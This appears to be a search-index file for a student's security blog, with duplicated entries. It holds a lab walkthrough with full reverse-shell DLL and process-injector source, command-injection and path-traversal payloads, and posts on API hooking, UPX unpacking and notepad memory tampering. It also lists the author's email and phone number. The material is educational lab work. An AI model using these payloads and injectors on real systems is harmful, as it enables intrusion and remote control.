<<<<<<< HEAD
{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"About me I'm Phuc; I'm pursuing B.S. in Cybersecurity Engineering at University of Cincinnati . I love playing piano, video games and capturing pictures of life. Currently, I'm doing Coop at Dr. Wang's lab at University of Cincinnati, working on side channel attack on AES encryption inside microcontrollers. My work includes assisting other graduate and senior undergraduate student on the research, summarizing experimental results and research findings, implementing and training neural network for deep learning side channel attack, performing side channel attack based CPA on AES. I have experience with reverse engineering and malware analysis using IDA, Ghidra, x64dbg, PE editor, PE bear. I also have experience with malware development using technique like DLL injection, thread hijacking, function hooking, Linux process injection with ptrace. I also have had sometime doing DFIR through practical labs. Last summer, I had an opportunity working with Viettel Cyber Security , where I had sometime doing log collection on customer's internal server for threat hunting operation later on. I also had a chance to watch operation in SOC, and learn about what's going on in real life industry. It was such amazing experience. For future, my goal is to work in Blue Team. The distance from me as of today to a Blue Teamer is long, and there are still alot of things and experience I have to acquire. With that in mind, I'm looking for a Coop/Intern position in summer of 2025 to gain more experience. Contact Email: maipd@mail.uc.edu Phone number: 949-247-6212 Github: https://github.com/mdphuc My file: https://github.com/mdphuc/myfile","title":"About"},{"location":"#about-me","text":"I'm Phuc; I'm pursuing B.S. in Cybersecurity Engineering at University of Cincinnati . I love playing piano, video games and capturing pictures of life. Currently, I'm doing Coop at Dr. Wang's lab at University of Cincinnati, working on side channel attack on AES encryption inside microcontrollers. My work includes assisting other graduate and senior undergraduate student on the research, summarizing experimental results and research findings, implementing and training neural network for deep learning side channel attack, performing side channel attack based CPA on AES. I have experience with reverse engineering and malware analysis using IDA, Ghidra, x64dbg, PE editor, PE bear. I also have experience with malware development using technique like DLL injection, thread hijacking, function hooking, Linux process injection with ptrace. I also have had sometime doing DFIR through practical labs. Last summer, I had an opportunity working with Viettel Cyber Security , where I had sometime doing log collection on customer's internal server for threat hunting operation later on. I also had a chance to watch operation in SOC, and learn about what's going on in real life industry. It was such amazing experience. For future, my goal is to work in Blue Team. The distance from me as of today to a Blue Teamer is long, and there are still alot of things and experience I have to acquire. With that in mind, I'm looking for a Coop/Intern position in summer of 2025 to gain more experience.","title":"About me"},{"location":"#contact","text":"Email: maipd@mail.uc.edu Phone number: 949-247-6212 Github: https://github.com/mdphuc My file: https://github.com/mdphuc/myfile","title":"Contact"},{"location":"2024_7_27_procinj/","text":"I created a Windows 10 Vuln machine July 27 2024 I created a windows 10 machine called ProcInj, focusing on process injection and path traversal technique to get reverse shell. This writeup serves as a guide to solve the machine. Instruction to set up the lab can be seen in https://github.com/mdphuc/myfile/tree/main/VM/ProcInj/README.md ProcInj hosts a website as below After messing around with the website, we notice that there's a form commented on the website, uncomment it and submit the form we have a zip file downloaded to our machine Try open it, we notice it's password protected Use JohnTheRipper to crack the password with password list: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/common-passwords-win.txt Unzip the file and open information.txt we have Messing around with the website, we notice it is used to compile a .cpp file into exe or dll. However, it forbids us to compile .cpp file with windows api into exe. Information.txt tells us that only C://ProgramData/ProcInj/System/debug.exe can run. Further test also shows that we can submit customed command with the form (We can craft it like hello && echo \"1\" > hello.txt then a file named hello.txt with 1 as its content will be created) As what Information.txt shows, our plan now is to create a dll file with windows api and run it by inject it into another process Our testdll.dll is crafted as followed #include <iostream> #include <windows.h> #include <winsock2.h> #include <stdio.h> #pragma comment(lib, \"w2_32\") using namespace std; #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) int __cdecl mbox(LPCWSTR msg){ WSADATA wsaData; SOCKET wSock; struct sockaddr_in hax; STARTUPINFO sui; PROCESS_INFORMATION pi; char *ip = \"192.168.1.25\"; short port = 4444; // init socket lib WSAStartup(MAKEWORD(2, 2), &wsaData); // create socket wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); hax.sin_family = AF_INET; hax.sin_port = htons(port); hax.sin_addr.s_addr = inet_addr(ip); // connect to remote host WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL); memset(&sui, 0, sizeof(sui)); sui.cb = sizeof(sui); sui.dwFlags = STARTF_USESTDHANDLES; sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock; // start cmd.exe with redirected streams CreateProcess(NULL, \"powershell.exe\", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); exit(0); MessageBox(NULL, TEXT(\"HELLO WORLD\"), TEXT(\"TEST\"), MB_OK); return 1; } #ifdef __cplusplus } #endif BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){ switch(fdwReason){ case DLL_PROCESS_ATTACH: mbox(L\"Run\"); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } Our debug.exe for injection is crafted as followed #include <windows.h> #include <tlhelp32.h> #include <iostream> #include <psapi.h> using namespace std; BOOL CompareCHAR(CHAR *char1, CHAR *char2){ int i = 0; while(char1[i] != '\\0' && char2[i] != '\\0'){ if (char1[i] != char2[i]){ return false; } i ++; } if ((char1[i] == '\\0' && char2[i] != '\\0') || (char1[i] != '\\0' && char2[i] == '\\0')){ return false; } return true; } DWORD GetProcessID(CHAR *process_name){ HANDLE process_snap; PROCESSENTRY32 pe32; HANDLE handle_process; process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); pe32.dwSize = sizeof(PROCESSENTRY32); Process32First(process_snap, &pe32); do{ if (CompareCHAR((CHAR*)pe32.szExeFile, process_name)){ return pe32.th32ProcessID; } // cout << pe32.szExeFile << \" \" << process_name << endl; }while(Process32Next(process_snap, &pe32)); return 0; } BOOL Inject(TCHAR *dll_to_inject, DWORD process_id_inject_to){ TCHAR dll_path[MAX_PATH]; GetFullPathName(dll_to_inject, MAX_PATH, dll_path, NULL); HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id_inject_to); LPVOID dllalloc = VirtualAllocEx(hproc, NULL, strlen((CHAR*)dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hproc, dllalloc, dll_path, strlen((CHAR*)dll_path), NULL); FARPROC loadlibraryA_addr = GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"LoadLibraryA\"); HANDLE rthread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlibraryA_addr, dllalloc, 0, NULL); WaitForSingleObject(rthread, INFINITE); return true; } int main(){ TCHAR dll_to_inject[MAX_PATH] = TEXT(\"C://ProgramData/ProcInj/Web/compiled/testdll.dll\"); CHAR process_to_get_id[] = \"cmd.exe\"; DWORD pid = GetProcessID(process_to_get_id); if (pid == 0){ cout << \"Cannot find id of target process\"; return 1; } cout << pid << endl; cout << Inject(dll_to_inject, pid); } This is your netcat server to receive reverse shell (change it accordingly to your own) char *ip = \"192.168.1.25\" short port = 4444 debug.exe is used to get cmd.exe's process id, and injection testdll.dll into that process id. Once CreateRemoteThread and WaitForSingleObject are called, function mbox in testdll.dll will run Information.txt tells us that debug.txt leaves under C://ProgramData/ProcInj/System, and website reveals ./Web/compiled . We guess that website is running under C://ProgramData/ProcInj/Web and sure file after being compiled will be stored at ./Web/compiled , so we may probably use ../.. in our payload We will initiate the process with these following payload respectively testdll.cpp -shared -lws2_32 -o testdll.dll debug.cpp -o ../../System/debug.exe hello && powershell C://ProgramData/ProcInj/System/debug.exe We got reverse shell in the end We also notice that we cannot use tasklist or tskill or stop-process to stop av.exe; however, once we got the shell, it's ok to do that and get full access of the shell","title":"I created a Windows 10 Vuln machine"},{"location":"2024_7_27_procinj/#i-created-a-windows-10-vuln-machine","text":"July 27 2024 I created a windows 10 machine called ProcInj, focusing on process injection and path traversal technique to get reverse shell. This writeup serves as a guide to solve the machine. Instruction to set up the lab can be seen in https://github.com/mdphuc/myfile/tree/main/VM/ProcInj/README.md ProcInj hosts a website as below After messing around with the website, we notice that there's a form commented on the website, uncomment it and submit the form we have a zip file downloaded to our machine Try open it, we notice it's password protected Use JohnTheRipper to crack the password with password list: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/common-passwords-win.txt Unzip the file and open information.txt we have Messing around with the website, we notice it is used to compile a .cpp file into exe or dll. However, it forbids us to compile .cpp file with windows api into exe. Information.txt tells us that only C://ProgramData/ProcInj/System/debug.exe can run. Further test also shows that we can submit customed command with the form (We can craft it like hello && echo \"1\" > hello.txt then a file named hello.txt with 1 as its content will be created) As what Information.txt shows, our plan now is to create a dll file with windows api and run it by inject it into another process Our testdll.dll is crafted as followed #include <iostream> #include <windows.h> #include <winsock2.h> #include <stdio.h> #pragma comment(lib, \"w2_32\") using namespace std; #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) int __cdecl mbox(LPCWSTR msg){ WSADATA wsaData; SOCKET wSock; struct sockaddr_in hax; STARTUPINFO sui; PROCESS_INFORMATION pi; char *ip = \"192.168.1.25\"; short port = 4444; // init socket lib WSAStartup(MAKEWORD(2, 2), &wsaData); // create socket wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); hax.sin_family = AF_INET; hax.sin_port = htons(port); hax.sin_addr.s_addr = inet_addr(ip); // connect to remote host WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL); memset(&sui, 0, sizeof(sui)); sui.cb = sizeof(sui); sui.dwFlags = STARTF_USESTDHANDLES; sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock; // start cmd.exe with redirected streams CreateProcess(NULL, \"powershell.exe\", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); exit(0); MessageBox(NULL, TEXT(\"HELLO WORLD\"), TEXT(\"TEST\"), MB_OK); return 1; } #ifdef __cplusplus } #endif BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){ switch(fdwReason){ case DLL_PROCESS_ATTACH: mbox(L\"Run\"); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } Our debug.exe for injection is crafted as followed #include <windows.h> #include <tlhelp32.h> #include <iostream> #include <psapi.h> using namespace std; BOOL CompareCHAR(CHAR *char1, CHAR *char2){ int i = 0; while(char1[i] != '\\0' && char2[i] != '\\0'){ if (char1[i] != char2[i]){ return false; } i ++; } if ((char1[i] == '\\0' && char2[i] != '\\0') || (char1[i] != '\\0' && char2[i] == '\\0')){ return false; } return true; } DWORD GetProcessID(CHAR *process_name){ HANDLE process_snap; PROCESSENTRY32 pe32; HANDLE handle_process; process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); pe32.dwSize = sizeof(PROCESSENTRY32); Process32First(process_snap, &pe32); do{ if (CompareCHAR((CHAR*)pe32.szExeFile, process_name)){ return pe32.th32ProcessID; } // cout << pe32.szExeFile << \" \" << process_name << endl; }while(Process32Next(process_snap, &pe32)); return 0; } BOOL Inject(TCHAR *dll_to_inject, DWORD process_id_inject_to){ TCHAR dll_path[MAX_PATH]; GetFullPathName(dll_to_inject, MAX_PATH, dll_path, NULL); HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id_inject_to); LPVOID dllalloc = VirtualAllocEx(hproc, NULL, strlen((CHAR*)dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hproc, dllalloc, dll_path, strlen((CHAR*)dll_path), NULL); FARPROC loadlibraryA_addr = GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"LoadLibraryA\"); HANDLE rthread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)loadlibraryA_addr, dllalloc, 0, NULL); WaitForSingleObject(rthread, INFINITE); return true; } int main(){ TCHAR dll_to_inject[MAX_PATH] = TEXT(\"C://ProgramData/ProcInj/Web/compiled/testdll.dll\"); CHAR process_to_get_id[] = \"cmd.exe\"; DWORD pid = GetProcessID(process_to_get_id); if (pid == 0){ cout << \"Cannot find id of target process\"; return 1; } cout << pid << endl; cout << Inject(dll_to_inject, pid); } This is your netcat server to receive reverse shell (change it accordingly to your own) char *ip = \"192.168.1.25\" short port = 4444 debug.exe is used to get cmd.exe's process id, and injection testdll.dll into that process id. Once CreateRemoteThread and WaitForSingleObject are called, function mbox in testdll.dll will run Information.txt tells us that debug.txt leaves under C://ProgramData/ProcInj/System, and website reveals ./Web/compiled . We guess that website is running under C://ProgramData/ProcInj/Web and sure file after being compiled will be stored at ./Web/compiled , so we may probably use ../.. in our payload We will initiate the process with these following payload respectively testdll.cpp -shared -lws2_32 -o testdll.dll debug.cpp -o ../../System/debug.exe hello && powershell C://ProgramData/ProcInj/System/debug.exe We got reverse shell in the end We also notice that we cannot use tasklist or tskill or stop-process to stop av.exe; however, once we got the shell, it's ok to do that and get full access of the shell","title":"I created a Windows 10 Vuln machine"},{"location":"2024_7_28_hook_api/","text":"x86 and x86_64 Function Hooking July 28 2024 Disclaimer: The ideas demonstrated here can be applied to both windows api function and normal user-supplied funciton Hook API is a technique of redirecting a Windows API call to our own customed function. In this blog post, I will discuss hooking in windows x86 (32 bit) and x64 (64 bit) by going over of hooking MessageBoxA function to display other content instead of user given content. The process of hooking in general can be seen as followed: The purpose of changing a few first bytes is for when that Windows API is called, RIP will point to the first instruction of that Windows API. In this situation, RIP will call a set of instruction to jump to our function first, then we do our malicious thing, restore those bytes and return. After this, the hooked function will resume its execution normally. For x86 machine, memory address is stored by 4 bytes and jmp instruction can be called directly to the memory address. jmp is 1 byte, that's why we need to take 5 bytes out For x64 machine, memory address is stored by 8 bytes and jmp instruction cannot be called directly to the memory address. We need to place that address into rax register and jmp to that register. jmp is 1 byte, rax is 2 byte, and memory address is 8 byte. The total is 12 bytes With that in mind, we can construct our code like this #include <windows.h> #include <iostream> using namespace std; BYTE *msgbox; BYTE originalBytes[12] = {0}; int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType); bool DeleteHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(msgbox + i) = *(DWORD64*)(originalBytes + i) ; } VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } bool SetHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(originalBytes + i) = *(DWORD64*)(msgbox + i); } *(BYTE *)(msgbox) = 0x48; *(BYTE *)(msgbox + 1) = 0xB8; //mov rax, ... *(DWORD64 *)(msgbox + 2) = FunctionHookTo; *(BYTE *)(msgbox + 10) = 0xFF; *(BYTE *)(msgbox + 11) = 0xE0; // jmp rax VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ int r; cout << \"Hello\" << endl; DeleteHook(); r = MessageBoxA(hwnd, \"Hooked\", lpCaption, uType); SetHook(); return 0; } void LaunchMessageBox(LPCSTR text, LPCSTR caption){ MessageBoxA(0, text, caption, MB_OK); } int main(){ msgbox = (BYTE *)GetProcAddress(GetModuleHandleA(\"user32.dll\"), \"MessageBoxA\"); SetHook(); while (true){ string launch_msg_box; string text, caption; cout << \"Launch message box? (y/n): \"; cin >> launch_msg_box; if (launch_msg_box == \"y\"){ cout << \"Text = \"; cin >> text; cout << \"Caption = \"; cin >> caption; cout << endl; LaunchMessageBox(LPCSTR(text.c_str()), LPCSTR(caption.c_str())); } } cout << \"Finish\" << endl; } User specify message box with one caption and content, but displayed message box will have attacker's adjustment I'll discuss the implementation of function hooking on Windows 10 notepad","title":"Introduction"},{"location":"2024_7_28_hook_api/#x86-and-x86_64-function-hooking","text":"July 28 2024 Disclaimer: The ideas demonstrated here can be applied to both windows api function and normal user-supplied funciton Hook API is a technique of redirecting a Windows API call to our own customed function. In this blog post, I will discuss hooking in windows x86 (32 bit) and x64 (64 bit) by going over of hooking MessageBoxA function to display other content instead of user given content. The process of hooking in general can be seen as followed: The purpose of changing a few first bytes is for when that Windows API is called, RIP will point to the first instruction of that Windows API. In this situation, RIP will call a set of instruction to jump to our function first, then we do our malicious thing, restore those bytes and return. After this, the hooked function will resume its execution normally. For x86 machine, memory address is stored by 4 bytes and jmp instruction can be called directly to the memory address. jmp is 1 byte, that's why we need to take 5 bytes out For x64 machine, memory address is stored by 8 bytes and jmp instruction cannot be called directly to the memory address. We need to place that address into rax register and jmp to that register. jmp is 1 byte, rax is 2 byte, and memory address is 8 byte. The total is 12 bytes With that in mind, we can construct our code like this #include <windows.h> #include <iostream> using namespace std; BYTE *msgbox; BYTE originalBytes[12] = {0}; int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType); bool DeleteHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(msgbox + i) = *(DWORD64*)(originalBytes + i) ; } VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } bool SetHook(){ DWORD original_protection; VirtualProtect(msgbox, 12, PAGE_EXECUTE_READWRITE, &original_protection); for (int i = 0; i < 12; i++){ *(DWORD64*)(originalBytes + i) = *(DWORD64*)(msgbox + i); } *(BYTE *)(msgbox) = 0x48; *(BYTE *)(msgbox + 1) = 0xB8; //mov rax, ... *(DWORD64 *)(msgbox + 2) = FunctionHookTo; *(BYTE *)(msgbox + 10) = 0xFF; *(BYTE *)(msgbox + 11) = 0xE0; // jmp rax VirtualProtect(msgbox, 12, original_protection, &original_protection); return true; } int FunctionHookTo(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType){ int r; cout << \"Hello\" << endl; DeleteHook(); r = MessageBoxA(hwnd, \"Hooked\", lpCaption, uType); SetHook(); return 0; } void LaunchMessageBox(LPCSTR text, LPCSTR caption){ MessageBoxA(0, text, caption, MB_OK); } int main(){ msgbox = (BYTE *)GetProcAddress(GetModuleHandleA(\"user32.dll\"), \"MessageBoxA\"); SetHook(); while (true){ string launch_msg_box; string text, caption; cout << \"Launch message box? (y/n): \"; cin >> launch_msg_box; if (launch_msg_box == \"y\"){ cout << \"Text = \"; cin >> text; cout << \"Caption = \"; cin >> caption; cout << endl; LaunchMessageBox(LPCSTR(text.c_str()), LPCSTR(caption.c_str())); } } cout << \"Finish\" << endl; } User specify message box with one caption and content, but displayed message box will have attacker's adjustment I'll discuss the implementation of function hooking on Windows 10 notepad","title":"x86 and x86_64 Function Hooking"},{"location":"2024_8_12_recon_upx_analysis/","text":"Recon_upx: The analysis of UPX-packed file Aug 12 2024 File: recon_upx In this blog post, I'll be discussing the use of IDA in performing static and dynamic analysis and unpacking a malware file. For more information related to IDA, visit https://hex-rays.com/ida-pro/ . IDA example: https://www.hackers-arise.com/post/2017/06/22/Reverse-Engineering-Malware-Part-3-IDA-Pro-Introduction First thing first, we'll use file command to get the information about the architecture of the file file ./recon_upx It's pointed out that recon_upx is actually an ELF 64 bit file (built specifically to run on Linux/UNIX). The file is statically linked and no section header. Normally, for a basic ELF file, there are .text , .bss , and .data section headers. This is to say that this ELF file is probably packed. The malware will unpack itself during run time, and then continue executing malicious code. readelf -a ./recon_upx also validates the packed state of recon_upx as explained above Our task here is first to unpack the file, then to analyze the file. For unpacking, we'll use IDA. Let's first load the program in IDA: According to readelf's output, once the program runs, EIP will first point to the entry point address 0x403858 (which is the address of start ) Going through many instructions below, we can see `sys_write (write to file, screen, memory, ...), sys_open (open file or virtual memory), sys_mmap (allocate virtual memory space), sys_mprotect (works like VirtualProtect Windows api to change permission of that virtual memory space). It seems like the program is trying to decompress itself into its own virtual memory. Notice that program continues by doing jmp r13 . We'll set a breakpoint here, 0x403AFC , to observe corresponding actions. Look at segments at this breakpoint, we can see recon_upx has 0x5000 in its virtual memory space from 0x7FFFF7FF4000 to 0x7FFFF7FF9000 containing DATA and CODE Hex dump we have We can presume that the program will then unpack code inside this section and write to its base segments. Continue execution we reach this point, 0x7FFFF7FF7C66 , followed by instruction at 0x408C01 , where there are syscall exit and retn . Debug until RIP reaches jmp r12 , we have segments table like this Segments of recon_upx have been changed, we can presume the unpacking process has finished Continue debuging we'll hit __libc_start_main , and if we'll let the program continue running, main malicious process will be deployed At start , we saw recon_upx spans from 0x400000 to 0x609308 When we hit jmp r12 as shown above, we can dump memory out using the following python code Once file is dumped, we can then try to fix file header and segments. Then we'll have complete file, which can further be analyzed by IDA (pseudocode). This dump memory process can also be done using IDA pro and its plugin https://github.com/WPeace-HcH/ElfDumper . This plugin allows more efficient dumping and no need to worry about fixing file headers and segments After this, we can load the dumped file in IDA again and use pseudocode to analyze the functionality of recon_upx","title":"Recon_upx The analysis of UPX-packed file"},{"location":"2024_8_12_recon_upx_analysis/#recon_upx-the-analysis-of-upx-packed-file","text":"Aug 12 2024 File: recon_upx In this blog post, I'll be discussing the use of IDA in performing static and dynamic analysis and unpacking a malware file. For more information related to IDA, visit https://hex-rays.com/ida-pro/ . IDA example: https://www.hackers-arise.com/post/2017/06/22/Reverse-Engineering-Malware-Part-3-IDA-Pro-Introduction First thing first, we'll use file command to get the information about the architecture of the file file ./recon_upx It's pointed out that recon_upx is actually an ELF 64 bit file (built specifically to run on Linux/UNIX). The file is statically linked and no section header. Normally, for a basic ELF file, there are .text , .bss , and .data section headers. This is to say that this ELF file is probably packed. The malware will unpack itself during run time, and then continue executing malicious code. readelf -a ./recon_upx also validates the packed state of recon_upx as explained above Our task here is first to unpack the file, then to analyze the file. For unpacking, we'll use IDA. Let's first load the program in IDA: According to readelf's output, once the program runs, EIP will first point to the entry point address 0x403858 (which is the address of start ) Going through many instructions below, we can see `sys_write (write to file, screen, memory, ...), sys_open (open file or virtual memory), sys_mmap (allocate virtual memory space), sys_mprotect (works like VirtualProtect Windows api to change permission of that virtual memory space). It seems like the program is trying to decompress itself into its own virtual memory. Notice that program continues by doing jmp r13 . We'll set a breakpoint here, 0x403AFC , to observe corresponding actions. Look at segments at this breakpoint, we can see recon_upx has 0x5000 in its virtual memory space from 0x7FFFF7FF4000 to 0x7FFFF7FF9000 containing DATA and CODE Hex dump we have We can presume that the program will then unpack code inside this section and write to its base segments. Continue execution we reach this point, 0x7FFFF7FF7C66 , followed by instruction at 0x408C01 , where there are syscall exit and retn . Debug until RIP reaches jmp r12 , we have segments table like this Segments of recon_upx have been changed, we can presume the unpacking process has finished Continue debuging we'll hit __libc_start_main , and if we'll let the program continue running, main malicious process will be deployed At start , we saw recon_upx spans from 0x400000 to 0x609308 When we hit jmp r12 as shown above, we can dump memory out using the following python code Once file is dumped, we can then try to fix file header and segments. Then we'll have complete file, which can further be analyzed by IDA (pseudocode). This dump memory process can also be done using IDA pro and its plugin https://github.com/WPeace-HcH/ElfDumper . This plugin allows more efficient dumping and no need to worry about fixing file headers and segments After this, we can load the dumped file in IDA again and use pseudocode to analyze the functionality of recon_upx","title":"Recon_upx: The analysis of UPX-packed file"},{"location":"2024_9_1_notepad_tapper/","text":"Notepad tapper Sep 1 2024 Disclaimer: The techniques discussed here work on Windows 10 notepad, but not Windows 11 notepad Introduction In this blog, I'll discuss how you can change data displayed on notepad process using code, and then showcase a simple space shooter game for notepad. We'll use windows api and Cheat Engine to achieve this. For more information of Cheat Engine, please visit: https://wiki.cheatengine.org/index.php?title=Tutorials:Cheat_Engine_Tutorial_Guide_x64 . This blog is inspired by Kyle Halladay 's post: Hooking Keyboard Input To Play Snake In Notepad.exe Initial Observe With Cheat Engine, we can find the address of specific word within notepad process (what we're trying to do). As of notepad, though it specifically say UTF_8 at the bottom right corner, data is actually encoded by UTF_16. How we know it? Let's examine using Cheat Engine. Let's try to find address of hello in the memory Fire up Cheat Engine and search for hello in UTF_8 we have nothing in return However, if we change the search to UTF_16, an address pops up Change value of this memory address will result in change in notepad process. With this in mind, we'll use code to automate our process. First, we'll try to find the memmory address associated with a value matched target pattern. Then. we'll try to change the value, and update the windows. Find pattern VirtualQueryEx will help us run through all memmory address of target process (region size, data, premission, ...). We then check if the region has COMMIT and READWRITE permission. Once we capture all of those region, we'll initiate our find pattern function to find our target address. char* GetProcessMemory(DWORD proc_id, char *pattern, size_t patternLen){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); LPVOID base = 0x0; MEMORY_BASIC_INFORMATION memInfo; size_t bytesread; int skip = 0; while (VirtualQueryEx(hproc, base, &memInfo, sizeof(memInfo))){ if (skip > 4){ if (memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE){ char *lpBuffer = (char *)malloc(memInfo.RegionSize); ReadProcessMemory(hproc, base, lpBuffer, memInfo.RegionSize, NULL); char* match = FindPattern(lpBuffer, memInfo.RegionSize, pattern, patternLen); if (match){ uint64_t diff = (uint64_t)match - (uint64_t)(lpBuffer); char* processPtr = (char *)base + diff; return processPtr; } } } // cout << endl << endl; skip ++; base += memInfo.RegionSize; } return nullptr; } To find pattern, first we'll initiate a pointer, ptr , points to the base address of target region. Then we'll move up until ptr is region size away from the base address. This can be done using this code: char* FindPattern(char* src, size_t srcLen, const char* pattern, size_t patternLen){ char* cur = src; size_t curPos = 0; while (curPos < srcLen){ if (memcmp(cur, pattern, patternLen) == 0){ return cur; } curPos++; cur = &src[curPos]; } return nullptr; } Next up, it's time to change the value and we all done. Change value There's a problem with changing value in memory address: 1) Value is changed but notepad's display may not be updated immediately. Manual interact with notepad process is required. 2) Region size is fixed. Updated value is constrained within that box. Tackling (1) is not that hard. Windows offers InvalidateRect functionality, which can force a process's window to update. bool UpdateProcessMemory(DWORD proc_id, LPVOID base, size_t size){ HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, proc_id); MEMORY_BASIC_INFORMATION memInfo; // char *payload = UTF16Convert((char *)target.c_str()); if(!WriteProcessMemory(hproc, base, buffer, size, NULL)){ return false; } RECT r; GetClientRect(notepad_hwnd, &r); InvalidateRect(notepad_hwnd, &r, false); return true; } Let's get into space shooter for notepad Space shooter Each line in notepad associates with one memory address. To make a game, we'll need to have the control of entire screen or notepad windows. To achieve this, the simplest way is to enable word wrap in notepad; we just have to deal with 1 giant word (1 memory address). However, recording keyboard input is not that easy. There's one way we can global hook keyboard; however, this will make anytime we press a key, an action will be initiated to space shooter game, no matter if we have notepad process as active window or not. To achieve this, we can install hook inside notepad process, then use socket api to transfer key stroke out to the main program to update space shooter. Our plan here in general is to build a dll that acts both like a keystroke capture and a socket client. We'll then hook that dll into notepad process. SetWindowsHookExA really actually helps hook keyboard with a dll. Payload dll should be loaded first by LoadLibraryA . Once it's loaded, export function will be accessible to main program, whose address got by GetProcessAddress can be used in SetWindowsHookExA . void InstallHook(DWORD thread_id){ TCHAR dll_path[MAX_PATH]; GetFullPathName(TEXT(\"./keyboard_dll.dll\"), MAX_PATH, dll_path, NULL); cout << dll_path << endl; HMODULE hooklib = LoadLibraryA((LPCSTR)dll_path); HOOKPROC hookfunc = (HOOKPROC)GetProcAddress(hooklib, \"HookProcedure\"); HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD, hookfunc, hooklib, thread_id); cout << \"Run\" << endl; while(GetMessage(NULL, NULL, WM_KEYFIRST, WM_KEYLAST)){} UnhookWindowsHookEx(keyboardhook); } Write dll One can compile dll from C++ or C code; basically the way C++ and C code works and written is the same; however, with C++, we have to wrap the following around our exported function: #ifdef __cplusplus extern \"C\" { #endif #ifdef __cplusplus } #endif Funtion to be exported can be defined like this: __declspec(dllexport) LRESULT CALLBACK name_of_function(param) Within dll file, DllMain is the entrypoint. DllMain can be defined like this BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) Exported function can be run when dll is attached or detached to or from a process or thread using the following template: BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved){ switch(fdwReason){ case DLL_PROCESS_ATTACH: break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } Dll can be compiled by g++ name.cpp -shared -o name.dll Sometimes, additional library flag needs to be added to compile, for example -lws2_32 for socket use Wrap up 24d8c0b19ce903c5812038c84cc93cb407e6bfa0 I'll not discuss how to set up socket server and client using windows api here, but this documentation might help: Socket Client and Socket Server Putting it all together, dll and server code can be found in my Github repo I'll not discuss in detail the logic of game shooter here, but the code for it can be found in my Github repo as well The full code can be found here . Here's some result:","title":"Notepad tapper"},{"location":"2024_9_1_notepad_tapper/#notepad-tapper","text":"Sep 1 2024 Disclaimer: The techniques discussed here work on Windows 10 notepad, but not Windows 11 notepad","title":"Notepad tapper"},{"location":"2024_9_1_notepad_tapper/#introduction","text":"In this blog, I'll discuss how you can change data displayed on notepad process using code, and then showcase a simple space shooter game for notepad. We'll use windows api and Cheat Engine to achieve this. For more information of Cheat Engine, please visit: https://wiki.cheatengine.org/index.php?title=Tutorials:Cheat_Engine_Tutorial_Guide_x64 . This blog is inspired by Kyle Halladay 's post: Hooking Keyboard Input To Play Snake In Notepad.exe","title":"Introduction"},{"location":"2024_9_1_notepad_tapper/#initial-observe","text":"With Cheat Engine, we can find the address of specific word within notepad process (what we're trying to do). As of notepad, though it specifically say UTF_8 at the bottom right corner, data is actually encoded by UTF_16. How we know it? Let's examine using Cheat Engine. Let's try to find address of hello in the memory Fire up Cheat Engine and search for hello in UTF_8 we have nothing in return However, if we change the search to UTF_16, an address pops up Change value of this memory address 